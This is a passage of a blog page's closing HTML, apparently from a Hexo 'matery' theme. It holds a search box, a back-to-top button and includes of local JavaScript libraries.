            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
